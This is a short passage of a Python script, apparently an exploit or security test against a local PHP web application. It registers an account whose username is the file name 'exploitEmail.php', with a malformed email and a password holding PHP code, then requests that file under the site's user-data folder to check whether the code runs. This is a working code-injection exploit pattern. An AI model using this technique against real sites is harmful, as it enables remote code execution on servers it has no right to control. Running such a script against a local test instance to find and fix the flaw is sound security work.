...
USER = {'username': 'exploitEmail.php', 'email': 'test@test..com', 'password': PHP}
ACCOUNT = SESSION.post(PATH_CREATE, data=USER)

PATH_EXPLOIT = 'http://localhost/site/data/users/exploitEmail.php'
ADMIN = SESSION.post(PATH_EXPLOIT)

if EXPECTED == ADMIN.text:
    print("Wrong Email Success!")
else:
    print("Wrong Email Fail")